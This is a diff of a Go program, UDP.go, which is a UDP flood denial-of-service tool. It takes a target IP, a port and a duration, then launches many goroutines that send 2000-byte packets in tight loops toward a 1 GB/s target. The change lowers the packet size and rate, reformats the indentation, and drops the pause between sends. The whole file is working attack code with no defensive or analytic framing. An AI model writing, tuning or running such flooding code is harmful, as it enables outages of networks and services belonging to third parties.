@@ -1,74 +1,73 @@
 package main
 
 import (
-    "fmt"
-    "net"
-    "os"
-    "strconv"
-    "sync"
-    "time"
+ "fmt"
+ "net"
+ "os"
+ "strconv"
+ "sync"
+ "time"
 )
 
 func main() {
-    if len(os.Args) != 4 {
-        fmt.Println("Usage: go run UDP.go <target_ip> <target_port> <attack_duration>")
-        return
-    }
+ if len(os.Args) != 4 {
+  fmt.Println("Usage: go run UDP.go <target_ip> <target_port> <attack_duration>")
+  return
+ }
 
-    targetIP := os.Args[1]
-    targetPort := os.Args[2]
-    duration, err := strconv.Atoi(os.Args[3])
-    if err != nil {
-        fmt.Println("Invalid attack duration:", err)
-        return
-    }
+ targetIP := os.Args[1]
+ targetPort := os.Args[2]
+ duration, err := strconv.Atoi(os.Args[3])
+ if err != nil {
+  fmt.Println("Invalid attack duration:", err)
+  return
+ }
 
-    // Calculate the number of packets needed to achieve 2GB/s traffic
-    packetSize := 3000 // Adjust packet size as needed
-    packetsPerSecond := 2_000_000_000 / packetSize
-    numThreads := packetsPerSecond / 30_000 // Adjust threads per second
+ // Calculate the number of packets needed to achieve 1GB/s traffic
+ packetSize := 2000 // Adjust packet size as needed
+ packetsPerSecond := 1_000_000_000 / packetSize
+ numThreads := packetsPerSecond / 15_000
 
-    // Create wait group to ensure all goroutines finish before exiting
-    var wg sync.WaitGroup
+ // Create wait group to ensure all goroutines finish before exiting
+ var wg sync.WaitGroup
 
-    // Loop to continuously send UDP packets
-    for {
-        select {
-        case <-time.After(time.Duration(duration) * time.Second):
-            fmt.Println("Attack finished.")
-            os.Exit(0)
-        default:
-            // Launch goroutine for each thread
-            for i := 0; i < numThreads; i++ {
-                wg.Add(1)
-                go func() {
-                    defer wg.Done()
-                    sendUDPPackets(targetIP, targetPort, packetsPerSecond)
-                }()
-            }
-            wg.Wait()
-        }
-    }
+ // Loop to continuously send UDP packets
+ for {
+  select {
+  case <-time.After(time.Duration(duration) * time.Second):
+   fmt.Println("Attack finished.")
+   os.Exit(0)
+  default:
+   // Launch goroutine for each thread
+   for i := 0; i < numThreads; i++ {
+    wg.Add(1)
+    go func() {
+     defer wg.Done()
+     sendUDPPackets(targetIP, targetPort, packetsPerSecond)
+    }()
+   }
+   wg.Wait()
+  }
+ }
 }
 
 func sendUDPPackets(ip, port string, packetsPerSecond int) {
-    conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
-    if err != nil {
-        fmt.Println("Error connecting:", err)
-        return
-    }
-    defer conn.Close()
+ conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
+ if err != nil {
+  fmt.Println("Error connecting:", err)
+  return
+ }
+ defer conn.Close()
 
-    // Generate and send UDP packets continuously
-    packet := make([]byte, 3000) // Adjust packet size as needed
-    for {
-        for i := 0; i < packetsPerSecond; i++ {
-            _, err := conn.Write(packet)
-            if err != nil {
-                fmt.Println("Error sending UDP packet:", err)
-                return
-            }
-        }
-        time.Sleep(50 * time.Microsecond) // Reduce time between each packet send
-    }
+ // Generate and send UDP packets continuously
+ packet := make([]byte, 2000) // Adjust packet size as needed
+ for {
+  for i := 0; i < packetsPerSecond; i++ {
+   _, err := conn.Write(packet)
+   if err != nil {
+    fmt.Println("Error sending UDP packet:", err)
+    return
+   }
+  }
+ }
 }
